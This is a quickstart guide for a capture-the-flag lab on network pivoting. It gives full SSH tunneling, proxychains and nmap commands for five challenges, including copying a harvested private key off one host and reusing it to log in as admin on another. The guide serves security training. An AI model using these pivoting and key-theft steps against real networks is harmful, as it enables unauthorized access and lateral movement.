# Lab 03 Student Quickstart Guide — NovaTech Corp

## 🛠️ Attacker Environment Requirements
To solve this lab, you **must use a separate attacker VM** (such as Kali Linux, Parrot OS, or a custom Ubuntu build) bridged or NAT'd to the same network as the lab appliance.

**Required Tools on your Attacker VM:**
- `ssh` and `scp` (OpenSSH Client)
- `curl` (Command-line HTTP client)
- `proxychains4` (For routing tools through SOCKS tunnels)
- **Optional:** A web browser with the *FoxyProxy* extension (for easy SOCKS5 routing)

---

## Briefing Portal
```
http://<VM_IP>:8083   →   shows your personalized SSH password
```

## Your Starting SSH Access
```
ssh pentest@<VM_IP> -p 2222
Password: (shown on briefing portal after first-boot setup)
```

---

## The 5 Challenges at a Glance

| # | Flag | Technique | One-liner |
|---|------|-----------|-----------|
| 1 | `LOCALFWD` | SSH local port forward | `ssh -L 8080:10.10.10.10:80 pentest@<IP> -p 2222 -N` |
| 2 | `SOCKS` | Dynamic SOCKS5 proxy | `ssh -D 1080 -N pentest@<IP> -p 2222` |
| 3 | `PROXYJUMP` | SSH ProxyJump | `ssh -J pentest@<IP>:2222 alpha@10.10.10.20` |
| 4 | `DOUBLEPIVOT` | Double pivot (chained -J) | `ssh -J pentest@<IP>:2222,alpha@10.10.10.20 -L 9090:172.16.50.10:9090 dummy@172.16.50.10 -N` |
| 5 | `LATERAL` | SSH key reuse | `ssh -i id_rsa -J pentest@<IP>:2222,alpha@10.10.10.20 admin@172.16.50.10` |

---

## Challenge 1 — SSH Local Port Forward

```bash
# Forward local port 8080 → ALPHA-1's HTTP service
ssh -L 8080:10.10.10.10:80 pentest@<VM_IP> -p 2222 -N &

# Now reach ALPHA-1 from your Kali machine
curl http://127.0.0.1:8080/
# or open Firefox → http://127.0.0.1:8080/
```
🏁 **Flag is in the HTTP response body.**

---

## Challenge 2 — Dynamic SOCKS5 Proxy

```bash
# Start SOCKS5 proxy on local port 1080
ssh -D 1080 -N -q pentest@<VM_IP> -p 2222 &

# Configure proxychains (edit /etc/proxychains4.conf):
# [ProxyList]
# socks5  127.0.0.1  1080

# Scan Segment Alpha through the proxy
proxychains4 nmap -sT -Pn -p 80,8080,22,8083 10.10.10.10 10.10.10.20

# Reach ALPHA-2 HTTP service
proxychains4 curl http://10.10.10.20:8080/
```
🏁 **Flag is in the HTTP response body.**

---

## Challenge 3 — SSH ProxyJump

```bash
# SSH directly into ALPHA-2 via PIVOT-1 (single command, no manual tunnel)
ssh -J pentest@<VM_IP>:2222 alpha@10.10.10.20

# Once on ALPHA-2:
cat ~/flag.txt          # FLAG{PROXYJUMP}
cat ~/notes.txt         # credentials note — useful for challenge 4
ls -la ~/.ssh/          # id_rsa is here — keep it for challenge 5!

# Copy id_rsa to your Kali machine (run on Kali):
scp -J pentest@<VM_IP>:2222 alpha@10.10.10.20:~/.ssh/id_rsa ./alpha2_id_rsa
chmod 600 ./alpha2_id_rsa
```
🏁 **Flag: `cat ~/flag.txt` on ALPHA-2.**

---

## Challenge 4 — Double Pivot (Reach Segment Beta)

```bash
# Method A: Chained ProxyJump + local port forward
ssh -J pentest@<VM_IP>:2222,alpha@10.10.10.20 \
    -L 9090:172.16.50.10:9090 \
    pentest@172.16.50.10 -N &

curl http://127.0.0.1:9090/

# Method B: Nested proxychains (if you prefer)
# In ssh_config (~/.ssh/config):
# Host pivot1
#     HostName <VM_IP>
#     Port 2222
#     User pentest
# Host alpha2
#     HostName 10.10.10.20
#     User pentest
#     ProxyJump pivot1
# Host beta1
#     HostName 172.16.50.10
#     User pentest
#     ProxyJump alpha2
ssh -L 9090:172.16.50.10:9090 -N beta1 &
curl http://127.0.0.1:9090/
```
🏁 **Flag is in the HTTP response body from BETA-1.**

---

## Challenge 5 — SSH Key Lateral Movement

```bash
# Use the id_rsa from ALPHA-2 to authenticate as 'admin' on BETA-1
ssh -i ./alpha2_id_rsa \
    -J pentest@<VM_IP>:2222,alpha@10.10.10.20 \
    admin@172.16.50.10

# Once logged in as admin on BETA-1:
cat ~/flag.txt          # FLAG{LATERAL}
whoami                  # should show: admin
hostname                # should show: beta-1
```
🏁 **Flag: `cat ~/flag.txt` on BETA-1 as `admin`.**

---

## Quick proxychains Setup

```bash
# Edit /etc/proxychains4.conf — ensure dynamic_chain is set:
sudo sed -i 's/^strict_chain/#strict_chain/' /etc/proxychains4.conf
sudo sed -i 's/^#dynamic_chain/dynamic_chain/' /etc/proxychains4.conf

# Add at the bottom:
echo "socks5  127.0.0.1  1080" | sudo tee -a /etc/proxychains4.conf
```

---

Good luck! 🎯 Pivot → Tunnel → Move Laterally.
